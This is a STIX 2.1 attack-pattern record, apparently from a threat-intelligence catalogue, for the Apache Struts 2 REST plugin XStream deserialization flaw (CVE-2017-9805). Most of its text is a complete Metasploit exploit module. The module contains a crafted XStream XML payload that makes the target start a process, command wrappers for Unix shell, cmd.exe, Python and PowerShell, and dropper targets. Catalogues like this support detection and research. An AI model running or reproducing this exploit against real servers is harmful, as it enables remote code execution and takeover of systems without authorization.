{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3af2ea58-42cd-4362-ba9d-74726b03f24d",
    "created": "2024-08-14T17:09:02.645066Z",
    "modified": "2024-08-14T17:09:02.64507Z",
    "name": "Apache Struts 2 REST Plugin XStream RCE",
    "description": " Apache Struts versions 2.1.2 - 2.3.33 and Struts 2.5 - Struts 2.5.12 using the REST plugin, are vulnerable to a Java deserialization attack in the XStream library. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/struts2_rest_xstream.rb",
            "external_id": "struts2_rest_xstream.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-9805"
        },
        {
            "source_name": "reference",
            "url": "https://struts.apache.org/docs/s2-052.html"
        },
        {
            "source_name": "reference",
            "url": "https://lgtm.com/blog/apache_struts_CVE-2017-9805_announcement"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/mbechler/marshalsec"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apache Struts 2 REST Plugin XStream RCE',\n      'Description'    => %q{\n        Apache Struts versions 2.1.2 - 2.3.33 and Struts 2.5 - Struts 2.5.12,\n        using the REST plugin, are vulnerable to a Java deserialization attack\n        in the XStream library.\n      },\n      'Author'         => [\n        'Man Yue Mo', # Vulnerability discovery\n        'wvu'         # Metasploit module\n      ],\n      'References'     => [\n        ['CVE', '2017-9805'],\n        ['URL', 'https://struts.apache.org/docs/s2-052.html'],\n        ['URL', 'https://lgtm.com/blog/apache_struts_CVE-2017-9805_announcement'],\n        ['URL', 'https://github.com/mbechler/marshalsec']\n      ],\n      'DisclosureDate' => '2017-09-05',\n      'License'        => MSF_LICENSE,\n      'Platform'       => ['unix', 'python', 'linux', 'win'],\n      'Arch'           => [ARCH_CMD, ARCH_PYTHON, ARCH_X86, ARCH_X64],\n      'Privileged'     => false,\n      'Targets'        => [\n        ['Unix (In-Memory)',\n          'Platform'   => 'unix',\n          'Arch'       => ARCH_CMD,\n          'Type'       => :unix_memory\n        ],\n        ['Windows (In-Memory)',\n          'Platform'   => 'win',\n          'Arch'       => ARCH_CMD,\n          'Type'       => :win_memory\n        ],\n        ['Python (In-Memory)',\n          'Platform'   => 'python',\n          'Arch'       => ARCH_PYTHON,\n          'Type'       => :py_memory\n        ],\n        ['PowerShell (In-Memory)',\n          'Platform'   => 'win',\n          'Arch'       => [ARCH_X86, ARCH_X64],\n          'Type'       => :psh_memory\n        ],\n        ['Linux (Dropper)',\n          'Platform'   => 'linux',\n          'Arch'       => [ARCH_X86, ARCH_X64],\n          'Type'       => :linux_dropper\n        ],\n        ['Windows (Dropper)',\n          'Platform'   => 'win',\n          'Arch'       => [ARCH_X86, ARCH_X64],\n          'Type'       => :win_dropper\n        ]\n      ],\n      'DefaultTarget'  => 0\n    ))\n\n    register_options([\n      Opt::RPORT(8080),\n      OptString.new('TARGETURI', [true, 'Path to Struts action', '/struts2-rest-showcase/orders/3'])\n    ])\n  end\n\n  def check\n    return CheckCode::Appears if execute_command(rand_str)\n\n    CheckCode::Safe\n  end\n\n  def exploit\n    case target['Type']\n    when /memory/\n      execute_command(payload.encoded)\n    when /dropper/\n      execute_cmdstager\n    end\n  end\n\n  def execute_command(cmd, opts = {})\n    cmd =\n      case target['Type']\n      when :unix_memory, :linux_dropper\n        %W{/bin/sh -c #{cmd}}\n      when :py_memory\n        %W{python -c #{cmd}}\n      when :psh_memory\n        if payload\n          cmd_psh_payload(\n            cmd,\n            payload.arch.first,\n            remove_comspec:       true,\n            encode_final_payload: true\n          ).split\n        else\n          %W{powershell.exe -c #{cmd}}\n        end\n      when :win_memory, :win_dropper\n        %W{cmd.exe /c #{cmd}}\n      end\n\n    # Encode each command argument with XML entities\n    cmd.map! { |arg| arg.encode(xml: :text) }\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path),\n      'ctype'  => 'application/xml',\n      'data'   => xstream_payload(cmd)\n    )\n\n    return false unless check_response(res)\n\n    true\n  end\n\n  # java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.XStream ImageIO\n  def xstream_payload(cmd)\n    # XXX: <spillLength> and <read> need to be removed for Windows\n    <<EOF\n<map>\n  <entry>\n    <jdk.nashorn.internal.objects.NativeString>\n      <flags>0</flags>\n      <value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\">\n        <dataHandler>\n          <dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\">\n            <is class=\"javax.crypto.CipherInputStream\">\n              <cipher class=\"javax.crypto.NullCipher\">\n                <initialized>false</initialized>\n                <opmode>0</opmode>\n                <serviceIterator class=\"javax.imageio.spi.FilterIterator\">\n                  <iter class=\"javax.imageio.spi.FilterIterator\">\n                    <iter class=\"java.util.Collections$EmptyIterator\"/>\n                    <next class=\"java.lang.ProcessBuilder\">\n                      <command>\n                        <string>#{cmd.join('</string><string>')}</string>\n                      </command>\n                      <redirectErrorStream>false</redirectErrorStream>\n                    </next>\n                  </iter>\n                  <filter class=\"javax.imageio.ImageIO$ContainsFilter\">\n                    <method>\n                      <class>java.lang.ProcessBuilder</class>\n                      <name>start</name>\n                      <parameter-types/>\n                    </method>\n                    <name>#{rand_str}</name>\n                  </filter>\n                  <next class=\"string\">#{rand_str}</next>\n                </serviceIterator>\n                <lock/>\n              </cipher>\n              <input class=\"java.lang.ProcessBuilder$NullInputStream\"/>\n              <ibuffer></ibuffer>\n              <done>false</done>\n              <ostart>0</ostart>\n              <ofinish>0</ofinish>\n              <closed>false</closed>\n            </is>\n            <consumed>false</consumed>\n          </dataSource>\n          <transferFlavors/>\n        </dataHandler>\n        <dataLen>0</dataLen>\n      </value>\n    </jdk.nashorn.internal.objects.NativeString>\n    <jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/>\n  </entry>\n  <entry>\n    <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n    <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n  </entry>\n</map>\nEOF\n  end\n\n  def check_response(res)\n    res && res.code == 500 && res.body.include?(error_string)\n  end\n\n  def error_string\n    'java.lang.String cannot be cast to java.security.Provider$Service'\n  end\n\n  def rand_str\n    Rex::Text.rand_text_alphanumeric(8..42)\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2017-09-05",
    "x_mitre_platforms": [
        "win'"
    ]
}